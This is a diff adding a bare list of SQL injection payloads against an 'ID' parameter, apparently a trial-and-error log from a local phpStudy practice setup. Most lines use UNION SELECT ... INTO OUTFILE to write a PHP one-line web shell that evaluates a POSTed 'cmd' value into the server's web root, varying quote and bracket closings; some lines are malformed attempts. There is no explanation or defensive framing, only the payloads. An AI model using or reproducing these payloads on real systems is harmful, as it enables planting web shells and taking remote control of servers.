@@ -1,0 +1,22 @@
+ID:1
+ID:1'
+ID:1'-- 
+ID:1
+ID:1"
+ID:1"-- 
+ID:1"union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'E:\\web\\phpStudy2017\\PHPTutorial\\WWW\\x.php'
+ID:1"union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\x.php'
+ID:1"union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php'
+ID:1"union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php'-- 
+ID:1"))union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php'-- 
+ID:-1" union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php'-- 
+ID:-1" union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php'-- 
+ID:-1' union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php'-- 
+ID:-1' union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php';-- 
+ID:-1' union select 1,*from"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php';-- 
+ID:-1' union select 1,load_film"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php';-- 
+ID:-1' union select 1,load_file"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php';-- 
+ID:-1')) union select 1,load_file"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php';-- 
+ID:-1')) union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\SQL\\x.php';-- 
+ID:-1')) union select 1,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\x.php';-- 
+ID:-1')) union select 1,2,"<?php @eval($_POST['cmd']);?>" into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\x.php';-- 
